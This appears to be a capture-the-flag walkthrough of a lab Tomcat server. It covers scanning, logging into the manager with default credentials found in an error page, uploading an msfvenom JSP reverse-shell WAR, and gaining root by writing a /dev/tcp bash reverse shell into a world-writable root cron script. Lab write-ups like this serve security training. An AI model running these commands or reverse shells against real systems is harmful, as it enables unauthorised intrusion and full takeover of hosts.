## nmap

```
[parrot]─[16:50-01/07]─[/home/glack]
└╼glack$nmap -sV -sT -p 22,8009,8080 10.10.113.14
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 16:53 IST
Nmap scan report for 10.10.113.14
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds

```

Webserver is running on port 8080

## HTTP

Default installation of apache tomcat server 8.5.5

Feroxbuster returns few interesting resources

```
┌[parrot]─[16:54-01/07]─[/home/glack]
└╼glack$feroxbuster -u http://10.10.113.14:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -n -t 60
```

```
302        0l        0w        0c http://10.10.113.14:8080/docs
302        0l        0w        0c http://10.10.113.14:8080/examples
302        0l        0w        0c http://10.10.113.14:8080/manager

```


This one ask us for basic auth when trying to access

```
http://10.10.113.14:8080/manager
```

After trying some random creds we get an error when when cancelling the request.

However this error includes some creds 

```
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```

It also says to examine this resource for some creds

```
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```

As soon as we login using the above creds in 
http://10.10.113.14:8080/manager/html

we get in the webapp as 'tomcat'.

Here we can see that we are able to upload a .war file on the webserver.

## Gaining Access

Now when running the msfvenom payload command  i was getting an error which i was not able to troubleshoot

```
[parrot]─[16:53-01/07]─[/home/glack/Downloads/Postman/app]
└╼glack$msfvenom -l payloads
Calling `DidYouMean::SPELL_CHECKERS.merge!(error_name => spell_checker)' has been deprecated. Please call `DidYouMean.correct_error(error_name, spell_checker)' instead.
[*] Bundler failed to load and returned this error:

   'You have already activated timeout 0.4.0, but your Gemfile requires timeout 0.3.2. Prepending `bundle exec` to your command may solve this.'

[*] You may need to uninstall or upgrade bundler
```

Now to bypass this i ran all in msfvenom commands in the msfconsole and created a payload for the target webserver with below command

```
[msf](Jobs:0 Agents:0) >> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.17.24.189 LPORT=9999 -f war > /home/glack/Desktop/THM/revshell.war
```

Gave the file executable permissions
```
[parrot]─[17:24-01/07]─[/home/glack/Desktop/THM]
└╼glack$chmod +x revshell.war
```

And uploaded it on the webserver

Started a netcat listener

```
┌[parrot]─[17:24-01/07]─[/home/glack/Desktop/THM]
└╼glack$nc -lnvp 9999 
```

And it did't work, so i had come across this type of exploit also in the past when trying to exploit a HTB machine - 'Jerry', so i used the knowledge base i created then to see where i went wrong

Ok so [[5. Machines/HTB/To Work On/Jerry/2. foothold|2. foothold]] This explains the details i'll just get into it

Used this command to list the contents of war file

```
┌[parrot]─[17:33-01/07]─[/home/glack/Desktop/THM]
└╼glack$jar tf revshell.war
```

And upon visiting the path with the name of jsp filename

```
http://10.10.113.14:8080/revshell/fkngrkcpl.jsp
```

We get a shell on the netcat listener

and we get the userflag

## Priv Esc

Now in the jack's home directory we can see other files

```
tomcat@ubuntu:/home/jack$ ls
ls
id.sh  test.txt  user.txt
```

This maybe a hint when trying to escalate privileges to root

and when checking the contents of both files we can see that 

```
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
id > test.txt

tomcat@ubuntu:/home/jack$ cat test.txt     
cat test.txt
uid=0(root) gid=0(root) groups=0(root)
```

"id.sh" is a bash file the generates the output of command "id" and adds it to the file "test.txt"

But since the file is owned by Jack
```
tomcat@ubuntu:/home/jack$ ls -al | grep id  
ls -al | grep id
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh

```

This output of this command shall gives the "id" details of jack but here we can see that it gives the "id" of root account. 

This makes us suspicious that the "id.sh" file is running with root privileges.

We can confirm this suspicion when checking the contents of crontab using

```
tomcat@ubuntu:/home/jack$ cat /etc/crontab
```

This "id.sh" file was a crontab created to run with root privileges. This file  "id.sh" runs every
 minute.
 
```
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
```

But we have write and execute permission for the "id.sh", that's not good configuration by the root. 

We can use this to escalate our privileges to the root user by changing the contents of "id.sh" using.

```
tomcat@ubuntu:/home/jack$ echo "bash -i >& /dev/tcp/10.17.24.189/9991 0>&1" > id.sh
```

You can get a list  of reverse shell lists from here(https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)



And start a netcat listener of my local machine

```
┌[parrot]─[17:49-01/07]─[/home/glack/Desktop/shellgen]
└╼glack$nc -lnvp 9991
```

We wait for sometime and we get a root shell and the root flag

```
root@ubuntu:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```
root@ubuntu:~# cat root.txt
cat root.txt
d89d5391984c0450a95497153ae7ca3a

```

